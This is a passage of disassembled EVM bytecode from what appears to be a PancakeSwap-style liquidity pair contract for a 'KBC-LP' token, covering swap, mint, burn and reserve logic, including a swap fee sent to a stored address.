JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x93D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP16 MUL DUP2 PUSH2 0x952 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP16 MUL DUP2 PUSH2 0x965 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP15 ISZERO PUSH2 0x986 JUMPI PUSH1 0x6 SLOAD PUSH2 0x986 SWAP1 DUP6 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH2 0x1D29 JUMP JUMPDEST DUP14 ISZERO PUSH2 0x9A4 JUMPI PUSH1 0x6 SLOAD PUSH2 0x9A4 SWAP1 DUP5 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP4 PUSH2 0x1D29 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x9EA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x9FE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA14 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP10 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xA60 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA74 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA8A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP7 POP PUSH1 0x0 SWAP6 POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP6 AND DUP11 SWAP1 SUB DUP4 GT PUSH2 0xAB1 JUMPI PUSH1 0x0 PUSH2 0xAC0 JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 GT PUSH2 0xADD JUMPI PUSH1 0x0 PUSH2 0xAEC JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 GT DUP1 PUSH2 0xAFD JUMPI POP PUSH1 0x0 DUP2 GT JUMPDEST PUSH2 0xB38 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x26BE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xB6C PUSH2 0xB4E DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0xB60 DUP8 PUSH2 0x2710 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xB84 PUSH2 0xB4E DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 POP PUSH2 0xBB6 PUSH4 0x5F5E100 PUSH2 0xBAA PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP12 DUP2 AND SWAP1 DUP12 AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0xBC6 DUP4 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST LT ISZERO PUSH2 0xC06 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x50616E63616B653A204B PUSH1 0xB0 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP PUSH2 0xC14 DUP5 DUP5 DUP9 DUP9 PUSH2 0x1F76 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE DUP1 DUP3 ADD DUP14 SWAP1 MSTORE PUSH1 0x60 DUP2 ADD DUP13 SWAP1 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP12 AND SWAP2 CALLER SWAP2 PUSH32 0xD78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822 SWAP2 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG3 POP POP PUSH1 0x1 PUSH1 0x10 SSTORE POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP3 PUSH1 0x1 PUSH1 0x70 SHL DUP4 DIV SWAP1 SWAP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV PUSH4 0xFFFFFFFF AND SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xCD4 CALLER DUP5 DUP5 PUSH2 0x2139 JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xD41 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x12 PUSH1 0x24 DUP3 ADD MSTORE PUSH18 0x2830B731B0B5B29D102327A92124A22222A7 PUSH1 0x71 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x8 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x9 DUP1 SLOAD SWAP4 SWAP1 SWAP5 AND SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SWAP2 SSTORE PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0xE01 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0xDDC SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0xE0C DUP5 DUP5 DUP5 PUSH2 0x219B JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xC SLOAD DUP2 JUMP JUMPDEST PUSH1 0xD SLOAD DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xEAC JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x21 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x269D PUSH1 0x21 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0xEFC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 DUP2 SWAP1 SSTORE DUP1 PUSH2 0xF0C PUSH2 0xC9D JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF60 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xF74 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF8A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFDD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xFF1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1007 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1026 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1043 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1051 DUP8 DUP8 PUSH2 0x2243 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x108E JUMPI PUSH2 0x107A PUSH2 0x3E8 PUSH2 0xB60 PUSH2 0x1075 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0x23B6 JUMP JUMPDEST SWAP9 POP PUSH2 0x1089 PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2408 JUMP JUMPDEST PUSH2 0x10DD JUMP JUMPDEST PUSH2 0x10DA PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x10AB DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x10B2 JUMPI INVALID JUMPDEST DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x10CD DUP7 DUP6 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x10D4 JUMPI INVALID JUMPDEST DIV PUSH2 0x248C JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x111C JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2771 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1126 DUP11 DUP11 PUSH2 0x2408 JUMP JUMPDEST PUSH2 0x1132 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1F76 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x1162 JUMPI PUSH1 0xB SLOAD PUSH2 0x115E SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP6 SWAP1 MSTORE DUP2 MLOAD CALLER SWAP3 PUSH32 0x4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F SWAP3 DUP3 SWAP1 SUB ADD SWAP1 LOG2 POP POP PUSH1 0x1 PUSH1 0x10 SSTORE POP SWAP5 SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xE SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x1225 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 DUP2 SWAP1 SSTORE DUP1 PUSH2 0x1235 PUSH2 0xC9D JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP5 SWAP7 POP SWAP3 SWAP5 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP4 SWAP2 AND SWAP2 PUSH1 0x0 SWAP2 DUP5 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1291 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x12A5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x12BB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP3 POP PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1309 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x131D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1333 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SLOAD SWAP2 SWAP3 POP PUSH2 0x1352 DUP9 DUP9 PUSH2 0x2243 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1369 DUP5 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x1370 JUMPI INVALID JUMPDEST DIV SWAP11 POP DUP1 PUSH2 0x1384 DUP5 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x138B JUMPI INVALID JUMPDEST DIV SWAP10 POP PUSH1 0x0 DUP12 GT DUP1 ISZERO PUSH2 0x139E JUMPI POP PUSH1 0x0 DUP11 GT JUMPDEST PUSH2 0x13D9 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2708 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x13E3 ADDRESS DUP5 PUSH2 0x24A4 JUMP JUMPDEST PUSH2 0x13EE DUP8 DUP14 DUP14 PUSH2 0x1D29 JUMP JUMPDEST PUSH2 0x13F9 DUP7 DUP14 DUP13 PUSH2 0x1D29 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP10 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x143F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1453 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1469 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP7 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP9 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14B5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x14C9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x14DF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP4 POP PUSH2 0x14EF DUP6 DUP6 DUP12 DUP12 PUSH2 0x1F76 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x151F JUMPI PUSH1 0xB SLOAD PUSH2 0x151B SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP13 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP13 SWAP1 MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP16 AND SWAP3 CALLER SWAP3 PUSH32 0xDCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496 SWAP3 SWAP1 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x10 DUP2 SWAP1 SSTORE POP SWAP2 POP SWAP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xCD4 CALLER DUP5 DUP5 PUSH2 0x219B JUMP JUMPDEST PUSH2 0x3E8 DUP2 JUMP JUMPDEST PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x1619 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 SSTORE PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND SWAP5 SWAP1 SWAP4 AND SWAP3 PUSH2 0x16C8 SWAP3 DUP6 SWAP3 DUP8 SWAP3 PUSH2 0x16C3 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 DUP6 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x168B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x169F JUMPI 